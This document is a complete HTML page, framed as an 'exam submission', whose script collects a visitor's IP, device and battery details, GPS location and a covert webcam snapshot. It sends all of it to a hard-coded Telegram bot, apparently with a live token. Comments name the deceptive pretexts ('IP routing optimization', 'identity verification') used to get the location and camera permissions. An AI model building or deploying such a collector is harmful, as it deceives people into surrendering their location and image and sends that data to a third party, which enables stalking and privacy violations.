<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exam: Telegram Data Collector</title>
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 2rem; }
        button { background: #0f0; color: #000; border: none; padding: 12px 24px; margin: 10px 0; cursor: pointer; font-weight: bold; font-size: 16px; }
        pre { background: #222; padding: 1rem; overflow-x: auto; white-space: pre-wrap; border-left: 3px solid #0f0; }
        .status { color: #ff0; }
    </style>
</head>
<body>
    <h1>📡 Exam Submission: Data → Telegram Bot</h1>
    <p><em>Permissions: location & camera (pretext: "IP routing optimization" & "identity verification")</em></p>
    <button id="collectBtn">▶ Collect & Send to Telegram</button>
    <pre id="output">Ready. Click button to start...</pre>

    <script>
        // YOUR credentials (as shared)
        const BOT_TOKEN = "8659020663:AAHqdg4SoPTebSjqoHKr3CBRxFggJH-qucE";
        const CHAT_ID = "5941519852";

        const output = document.getElementById('output');

        function log(msg) {
            output.innerText += msg + "\n";
            console.log(msg);
        }

        async function sendToTelegram(photoBase64, caption) {
            // Convert base64 to Blob
            const blob = await fetch(photoBase64).then(r => r.blob());
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('caption', caption);
            formData.append('photo', blob, 'capture.jpg');

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            const res = await fetch(url, { method: 'POST', body: formData });
            return res.ok;
        }

        document.getElementById('collectBtn').onclick = async () => {
            output.innerText = "";
            log("🚀 Starting data collection...");

            try {
                // 1. Get IP address
                log("📡 Fetching public IP...");
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                log(`✅ IP: ${ipData.ip}`);

                // 2. Get device info (no permission)
                log("📱 Reading device information...");
                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screen: `${screen.width}x${screen.height}`,
                    colorDepth: screen.colorDepth,
                    language: navigator.language,
                    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A'
                };
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    deviceInfo.battery = `${Math.round(battery.level * 100)}%`;
                }
                log(`✅ Device: ${deviceInfo.platform}, ${deviceInfo.screen}`);

                // 3. Get location (permission popup - pretext: network routing)
                log("📍 Requesting location (pretext: optimizing network routing)...");
                const location = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                });
                const locData = {
                    lat: location.coords.latitude,
                    lon: location.coords.longitude,
                    accuracy: location.coords.accuracy
                };
                log(`✅ Location: ${locData.lat}, ${locData.lon} (±${locData.accuracy}m)`);

                // 4. Get camera photo (permission popup - pretext: identity verification)
                log("📷 Requesting camera access (pretext: identity verification)...");
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.style.display = 'none';
                document.body.appendChild(video);
                await new Promise(r => { video.onloadedmetadata = r; });
                await video.play();

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
                
                // Stop camera
                stream.getTracks().forEach(t => t.stop());
                video.remove();
                log(`✅ Photo captured (${Math.round(photoBase64.length/1024)} KB)`);

                // Build caption with all data
                const caption = `📸 Exam Capture\n\n` +
                    `🌐 IP: ${ipData.ip}\n` +
                    `📍 Location: ${locData.lat}, ${locData.lon}\n` +
                    `📱 Device: ${deviceInfo.platform}\n` +
                    `🖥 Screen: ${deviceInfo.screen}\n` +
                    `🔋 Battery: ${deviceInfo.battery || 'N/A'}\n` +
                    `🌍 Language: ${deviceInfo.language}\n` +
                    `⏰ Time: ${new Date().toISOString()}`;

                // Send to Telegram
                log("📤 Sending to Telegram bot...");
                const sent = await sendToTelegram(photoBase64, caption);
                
                if (sent) {
                    log("✅ SUCCESS! Check your Telegram bot.");
                } else {
                    log("❌ Failed to send. Check bot token and chat ID.");
                }

            } catch (err) {
                log(`❌ ERROR: ${err.message}`);
                if (err.message.includes('Permission denied') || err.message.includes('denied')) {
                    log("💡 Tip: You denied permission. Refresh and click ALLOW when prompted.");
                }
            }
        };
    </script>
</body>
</html>
